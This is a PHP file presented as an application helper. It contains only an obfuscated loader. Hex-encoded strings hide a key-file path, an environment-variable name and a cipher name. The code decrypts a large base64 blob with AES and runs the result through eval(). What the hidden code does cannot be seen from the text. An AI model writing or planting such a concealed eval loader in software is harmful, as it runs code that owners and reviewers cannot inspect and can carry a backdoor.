<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('9RheadSPZlv+MO/BvIVI3A==');

$c=base64_decode(

'RGuS5DCuidCICu9Zhd2WiM3TIrlM7TMe09dQcB2Vm+lHoc2WUF93CAgDD6whmPc6NZsEk9FwoctW' .
'gANDDYnzt8kD6hY2LLr2KnPWBdI4MYlgFwMuARjCqLGVvckPh4QG6XN+sMO2vtm9iw8yhjtyyN9v' .
'oTUPaqXS6kxRKps3VzSq+mztrWjec7QQY6pvPE81lSug9SKyh4THM2hJF2HAEQwWDoIBNQXi5RmE' .
'Ui79RFd58duKvRu7y+a16zaQTvy8Od83e+Agbn5d+P060gB4xy+xCAb67ACY1AgTC/p3/YfVlJ1H' .
'wcBt7e+jBnYL6zu/aM1lv1X654jA1Ts4WXLQWQxC5fbJZdB0SmSal/NNqTGGSBy8xr9fvmQiN07i' .
'UgHyoqsTjI4KeIdTrMG9+OnApuhfGQPj5IVEAl+Ml3/kLDLd37w5DDD1jvASGegLwmslGRw0EFR4' .
'j/Xrwzt7PzPD60m9RG3ysdtkiICZraoqHByv05cEzmqbuBfwlUr9Y2JwIMgMiAhmVaqJdcn/RCNI' .
'e+XpLRReny11ll1dCW/RxZLTJJ59YTME6BKFEFIxfFAByle85ars6o4Cvezz6r9CdOiyLssvpJLY' .
'/vkBngsNyyJqp4AVkpCRHugVt3LHFoC3a2ips63BwVykwgrmIJs9wfsPYrh1W1ZTfzBElUaZwngn' .
'+xRForR7uWFN8wm1B9Aa8g8VuhmHxVmefsesgqjSG2HrvUzUrhwWUFA5PSviwYYj6LKTBWXofEon' .
'gX66SOGXSKZoLiAIar7c5NGEar3pAStScuuNTFy7nHF1F0enKSc2AuaSvrHARWcmvWTte8MBVFGw' .
'Z3l3Afx4K57LTkCO9J4CCeekNn8dA6ELF+Vv4CnY29Kz78snFx2yyOVYVNylJNhIo3RQt7BRXSG2' .
'3jRnR7Ezteb7IVuLy42QlPeYMfBv8QdqQ0LnvCzSG00/9qjHh5zpXo+bNA6QPNx2ovNEB2HK/a9G' .
'ji4XyBxlPEcLU644spiaOM2ttOboE5EApkCi5ksq0ly1o7e2LTx/qEfDNjqEippGsvwmr9fkXzdT' .
'VjvsS27lEcY9psCsfRQpA43O7tcie2oTcVqc+1Sr0zruh+ozjgRQlATMMXFRpKV9ntYfzctmkbQg' .
'16PzDtauTPwCGAr8GuvvVrsxLVDLv1f4MVBWefzpvaYpreGxkMZxhETDwsuS18kU1ulEzLbAWr8T' .
'hXHQfD2HkdFMm82VWJWG3s3IQOBASjjCfnOGJIMZgxG+FtpBebNmMc9NIeoGW6GSit/7OC7SBckz' .
'oXDX1xJLwsvSMo9m3jRVGDU+Uzev8QtNwyawqOPEUb3a/PUI5oLhGWMXUK0m8419Xj6OH5jfDIEX' .
'+d3m2nGCcZR0bTts2moiWGttreV0178G1HratmCiD+By+S+IGxy0WQR1Iq3cfYfN/fvGPzTzaKFP' .
'dL7HCHdXiW1K3m1W6wtcV7ChtkXhf0Icmn1Zru7ROgeUjBi2C33wa4X9ueJY3HSnGu01pI67afa8' .
'uOLVI4GkQ7bZyOyw445KOQ5DeUwnDIN1AS4ORm8s+scKc3vaDPzvTO5d4UIFZfiVSdYrS8LaCVcg' .
'K9XjhLEham1+U2KygE4H4Q9XnNzVaVhmmk5vGimuUctpugdpHNJhNmMwPa/lhEnMn4nRaGsIGs57' .
'zpBwzlRCPP15El/tA/YspAA51uyBfq2zWI2EzZvAoKR8Gws7uZ5P/gRSdhnq1T1AfoGuNjbnXzoW' .
'zBLa1I/B/9SH36vaktiB1fonAxl494MeNf9BLo+fgGzCencK5WEjUJbNuidWuQeLjR5YXCBg100g' .
'ZjhW8HXihYKMuJn+r0lg+2UYEMy1RpiNRE+nu15IrIbuRYdymsZ90euYh0FP2c5+S5kkB1OVl9nR' .
'VJyrKw+qz+wBMmM8UPNooiReGlF6L7GBufh8v6x42228HCbc3IQ71KqN11GFNhTxAVvQhyNUM2DF' .
'yy0tchfcmXVp+mWio8rrhWm6AC/Zcc0fkcon4iDsc6w2Zmh7n8DmMd4rdelXidPwZKjWr/jweaqY' .
'FFCZkdPqG3lKJY7bGKV/e4AXiM3fKRiYud1sZpSkQgIMK/oCA58a0mHP17NIgdGMw+9Rvx4b0rDn' .
'y3YL4whFDcviq9xetNx/Uq0ZnO0LSH+12EabCFktpG/YcUb4dFNLcXGbIB2eehUV7Yw/cc+mtOJa' .
'/oMgr6z3blABGGnYPSP4DcTuARIP3KgIFrZySS1rdsR3/eVSeaGZ+Nb5ucxgxbs150YSgfpGhPSN' .
'W7P7DNaKbONLGdNhbLI72MImginLElpAk/jHvyLGa4/zS+RtOMG2de0TEVFh8S+CWP9W1AsHOcf2' .
'wC9x+y/8hgoTMl5PiXb9ABvklXVQd/tC5xHIRzRzcnDySxeYqyru8VtoOUQewa0uKubYeqjfGhms' .
'6ZoDJ6EFhau18AvQ7o3e3io8UGAjz6QnHE837k9C4qG34ZYDU2YK/J59+MhBOtcKgKGoHVG1ShCp' .
'Pn8seWdbwNVhLVUH2cbdveF9ahAHqueBw+KURr87uCoMuKA7drA4F9s5quM3p/4Bfa/SNYe1vkj2' .
'UuGK5aFNa1NoU1Uc+XQY33AOBWXJwLBetz6CPUL4U2NRcfKqBdy+ci8kdXVuBbIaKtVwvZ+8vrII' .
'+BUAXwcIASph9bvqXik3imeupQTGUVbXaJ1ym7KD827TzN4XZl6zXUFQi0IkZwyWAf+IQapxyMAp' .
'+PKa1h6bkYs2PYfuifK3GXWlHxoRAXuan3s9oVpn89jsImgOvfha3SwvmZxI8qf1HTpfC2O1o0ZP' .
'LwlH7UjkNFg935jhGZhpgtxtzj5ECm144x0aInMIMSxzSydH9eiL5dKeJgWb7HA4zfzc13DZHZ6s' .
'50lF4zECPdhVdEdvHmAWpVo5rt8GgVB5pbb1P+3Irfpi0LiXWuoTyFwROczpbuxqBENSiHSQ9iDq' .
'rpQnEjjL1ailcg54wwYv4VA='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

